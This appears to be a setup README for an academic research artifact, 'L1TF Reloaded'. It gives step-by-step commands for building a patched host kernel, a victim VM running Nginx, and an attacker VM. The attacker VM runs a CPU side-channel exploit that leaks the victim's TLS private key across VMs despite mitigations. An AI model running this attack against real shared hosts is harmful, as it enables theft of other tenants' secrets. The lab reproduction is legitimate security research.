Skylake Server
==============

We assume you have access to a Skylake server running Ubuntu 24.04.

You can for example get access to such a machine via the Chameleon Cloud:
https://chameleoncloud.readthedocs.io/en/latest/getting-started/


Install the required packages on the server:
```
sudo apt-get update
sudo apt install -y locales-all fakeroot git kernel-wedge quilt ccache flex bison libssl-dev dh-exec rsync libelf-dev bc libncurses-dev lz4 liblz4-dev tmux cmake libgmp3-dev debootstrap
```
And clone our repo:
```
git clone git@github.com:vusec/rain.git ~/rain
```

Host Kernel
===========

We start by preparing the host kernel.
```
mkdir ~/host; cd ~/host
```
Get Linux kernel v6.12 source code:
```
git clone --branch v6.12 --depth=1 https://github.com/torvalds/linux.git
```
Take your current Ubuntu 24.04 kernel config, and disable kernel signature checking:
```
cd linux
cp /boot/config-6.8.0-64-generic .config
scripts/config -d CONFIG_SYSTEM_REVOCATION_KEYS -d CONFIG_SYSTEM_TRUSTED_KEYS
make olddefconfig
```
Optionally, if you want to add "helper hypercalls", useful for debugging and
exploit development, add them to the host kernel now. For example, apply the
patch `setup/helper-hc.patch`. This would allow you to use `HELPERS=1` and
`LEAK=CHEAT` in `include/config.h`, to run the exploit without L1TF leakage, but
with hypercall-reads instead, as a sanity check.
Then build the kernel:
```
make bindeb-pkg -j`nproc`
```
Install the new kernel:
```
sudo dpkg -i *6.12*.deb
```
And reboot into it:
```
sudo reboot
```
After reboot, ensure Linux-6.12.0 is running:
```
uname -r
```
Also check that you have the default Ubuntu L1TF mitigations, namely SMT on and
conditional L1D flushing:
```
lscpu | grep -i l1tf
```

Victim VM
=========

Let's create the victim VM. As its kernel we take the same, 6.12 kernel we build
for the host. We make the disk 32 GB and put a default (latest stable) Debian
installation on it.
```
mkdir ~/victim; cd ~/victim
~/rain/setup/bootstrap-vm.sh --name victim --size 32 --kernel ~/host/linux
```
Boot the victim VM on two siblings of one physical core (CPU 0's):
```
./run-vm.sh victim 7777 `cat /sys/devices/system/cpu/cpu0/topology/thread_siblings_list`
```
Wait a few seconds for the VM to boot up, and then copy over this install script:
```
scp ~/rain/setup/install_nginx_https.sh victim:~
```
Login to the victim VM:
```
ssh victim
```
And install Nginx, generate a self-signed TLS certificate, and configure Nginx
to HTTPS:
```
./install_nginx_https.sh
``` 
Take a look at Nginx's private key of its TLS certificate:
```
sudo cat /etc/ssl/private/nginx-selfsigned.key
```
If all goes well, our attacker VM should leak this key from Nginx's memory.
Exit the victim VM, to go back to the host:
```
exit
```

Attacker VM
===========

For the attacker VM's kernel, we reuse the same linux kernel tree, and we'll
install a page fault handler bypass:
```
cd ~/host/linux
git apply ~/rain/setup/l1tf-pf.patch
```
Next, we bootstrap the attack VM:
```
mkdir ~/attacker; cd ~/attacker
cp ~/rain/setup/*-vm.sh .
./bootstrap-vm.sh --name attacker --size 32 --kernel ~/host/linux
```
Boot the attacker VM on two siblings of another physical core (CPU 1's) than the victim:
```
./run-vm.sh attacker 7778 `cat /sys/devices/system/cpu/cpu1/topology/thread_siblings_list`
```
Check that indeed the attacker and victim run on separate physical cores, as is
enforced by the core-scheduling mitigation:
```
taskset -c -p `sudo cat ~/victim/victim.pid`
taskset -c -p `sudo cat ~/attacker/attacker.pid`
```

Exploit: L1TF Reloaded
======================

SSH into the attack VM:
```
ssh attacker
```
And clone the exploit code:
```
git clone git@github.com:vusec/rain.git
cd rain
```
Load the required dependencies and install the needed kernel modules:
```
make load_modules
```
Ensure `include/config.h` holds the following configuration:
```
#define MACHINE LINUX_6_12
#define HELPERS 0
#define LEAK L1TF
```
Note: if you want a sanity check first, and you have installed helper hypercalls
in the host kernel, then you can also first put `HELPERS` to 1 and `LEAK` to
`CHEAT`.
In `include/constants.h`, ensure this line defines the correct amount of host
physical memory on you system (check with `free -h` on the host).
```
#define HOST_MEMORY_SIZE (64 * 1024ULL*1024*1024)
```

Build the exploit:
```
make exploit
```

Run the exploit:
```
make
```

This can take many hours, hence we recommend running this inside a tmux session or similar.
Output of `stdout` will go to the screen as well as the file `std.out`, and extra
verbose `stderr` output is saved in the file `std.err`.

If all goes well, you expect to see something similar to our demo, resulting in a leaked private key.
To check its correctness, compare it against the true key of the victim's Nginx webserver,
located at `victim:/etc/ssl/private/nginx-selfsigned.key`.
